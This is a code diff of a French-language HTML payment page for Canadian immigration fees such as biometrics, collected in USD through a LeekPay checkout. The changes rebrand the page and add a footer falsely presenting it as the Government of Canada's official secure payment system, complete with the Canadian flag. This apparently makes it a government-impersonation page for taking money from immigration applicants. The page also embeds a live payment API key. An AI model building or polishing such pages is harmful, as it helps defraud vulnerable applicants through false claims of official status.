@@ -2,7 +2,8 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Paiement ACDH</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Paiement immigration canada</title>
 
 <style>
 body{
@@ -15,6 +16,7 @@ body{
   justify-content:center;
   align-items:center;
   height:100vh;
+  margin:0;
 }
 
 .box{
@@ -23,14 +25,20 @@ body{
   border-radius:12px;
   width:350px;
   text-align:center;
+  box-shadow:0 0 15px rgba(0,0,0,0.2);
 }
 
-.logo{ width:120px; margin-bottom:10px; }
+.logo{
+  width:120px;
+  margin-bottom:10px;
+}
 
 select,button{
   width:100%;
   padding:12px;
   margin-top:10px;
+  border-radius:6px;
+  border:1px solid #ccc;
 }
 
 button{
@@ -41,9 +49,28 @@ button{
   cursor:pointer;
 }
 
+button:hover{
+  background:#0097a7;
+}
+
 #amount{
   margin-top:10px;
   font-weight:bold;
+  color:#333;
+}
+
+.footer{
+  position:fixed;
+  bottom:10px;
+  width:100%;
+  text-align:center;
+  color:white;
+  font-size:12px;
+}
+
+.footer img{
+  width:30px;
+  margin-top:5px;
 }
 </style>
 
@@ -57,7 +84,7 @@ button{
 
 <img src="logo.png" class="logo">
 
-<h3>Paiement ACDH Services Canada</h3>
+<h3>Paiement immigration Canada</h3>
 
 <select id="service" onchange="updateAmount()">
   <option value="150">1 - Demande biométrique - 150 USD</option>
@@ -76,25 +103,27 @@ Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée
 
 </div>
 
+<!-- SIGNATURE -->
+<div class="footer">
+  <p>© 2026, gouvernement du Canada - officiel système de paiement sécurisé. </p>
+  <p>Plateforme sécurisée 🔒</p>
+  <img src="https://upload.wikimedia.org/wikipedia/en/c/cf/Flag_of_Canada.svg">
+</div>
+
 <script>
 
-const rate = 600; // conversion USD → XOF
-
 function updateAmount(){
-  let usd = parseFloat(service.value);
-  let xof = Math.round(usd * rate);
-
-  amount.innerText = "Montant à payer : " + xof + " XOF";
+  let usd = service.value;
+  amount.innerText = "Montant à payer : " + usd + " USD";
 }
 
 function payer(){
 
   let usd = parseFloat(service.value);
-  let xof = Math.round(usd * rate);
 
   LeekPay.checkout({
-    amount: xof,
-    currency: "XOF",
+    amount: usd,
+    currency: "USD",
     apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
   });
 
